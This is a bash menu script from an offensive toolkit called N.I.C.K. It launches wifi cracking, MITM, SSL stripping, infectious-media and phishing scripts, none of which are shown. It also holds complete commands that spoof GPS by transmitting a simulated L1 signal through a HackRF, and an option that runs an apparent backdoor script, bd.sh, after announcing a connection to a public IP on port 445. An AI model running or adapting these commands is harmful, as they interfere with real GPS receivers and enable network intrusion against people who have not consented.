#!/bin/bash

#    This file is part of N.I.C.K.

#    N.I.C.K is free software: you can redistribute it and/or modify
#    it under the terms of the GNU General Public License as published by
#    the Free Software Foundation, either version 3 of the License, or
#    (at your option) any later version.

#    N.I.C.K is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU General Public License for more details.

#    You should have received a copy of the GNU General Public License
#    along with N.I.C.K.  If not, see <http://www.gnu.org/licenses/>.


BOLD='\e[32;1m'
PLN='\e[0m'
RED='\033[32;31m'
GRN='\033[0;32m'
NC='\033[0m'
BLU='\033[1;34m'
figlet -f big "|_N.I.C.K_|"

echo -e "\n${BOLD}${RED}By ₹ishabh${NC}${PLN}"
echo -e "N.I.C.K  Copyright (C) 2017  Rishabh Kumar\n"
./reset.sh
zenity --question --title="Server-Machine" --text="Do you want to connect to the server-machine" 2>/dev/null
if [ $? -eq 0 ]
then
  $PWD/server/server_connect.sh;
fi

ser_sta=$(sed -n '4p' $PWD/server/server_status.txt)

printf "\n\n[+] Press ${GRN}1${NC} for Wifi Cracking\n[+] Press ${GRN}2${NC} for MITM Attacks\n[+] Press ${GRN}3${NC} for SSL MITM Attack\n[+] Press ${GRN}4${NC} to Generate Infectious Media\n[+] Press ${GRN}5${NC} for Phishing Attack\n[+] Press ${GRN}6${NC} for GPS Spoofing Attack\n[+] Press ${GRN}7${NC} for connecting to IRC\n\n"
read opt

if [ $opt -eq 1 ]
then
  echo -e "\n${BLU}Wifi Cracking Script Started... ${PLN}"
  $PWD/wifi_scripts/wifi_cracking.sh
elif [ $opt -eq 2 ]
then
  echo -e "\n${BLU}MITM Script Started...${PLN}"
  $PWD/mitm/mitm.sh;
elif [ $opt -eq 3 ]
then
  echo -e "\n${BLU}SSL Strip Script Started...${PLN}"
  $PWD/ssl/smitm.sh;
elif [ $opt -eq 4 ]
then
  $PWD/inf_media/inf_media.sh
elif [ $opt -eq 5 ]
then
  echo "Phishing Script Started"
elif [ $opt -eq 6 ]
then
  echo -e "\n[+] Enter the ${BOLD}${RED}path${PLN}${NC} to GPS broadcast ephemeris file :- "
  read ephemeris;
  echo -e "\n[+] Enter the ${BOLD}${RED}latitude${PLN}${NC} of spoofed location :- "
  read lat;
  echo -e "\n[+] Enter the ${BOLD}${RED}longitude${PLN}${NC} of spoofed location :- "
  read lon;
  echo -e "\nGenerating binary file to transmit..."
  echo "$ephemeris, $lat, $lon"
  /root/Documents/gps/gps-sdr-sim/gps-sdr-sim -b 8 -e $ephemeris -l $lat,$lon,100 ;
  echo -e "\n${BOLD}${BLUE}Binary file generation success !!!"
  echo "Simulating GPS signals using HackRF One"
  hackrf_transfer -t /root/Documents/gps/gps-sdr-sim/gpssim.bin -f 1575420000 -s 2600000 -a 1 -b 2500000  -x 0;

elif [ $opt -eq 7 ]
then
  echo -e "\n${BOLD}${RED}Connecting to 202.48.73.194:445... ${NC}${PLN}"
  sleep 5;
  ./bd.sh


else
  echo -e "\n${BOLD}${RED}Wrong Input${NC}${PLN}"
  exit 0
fi

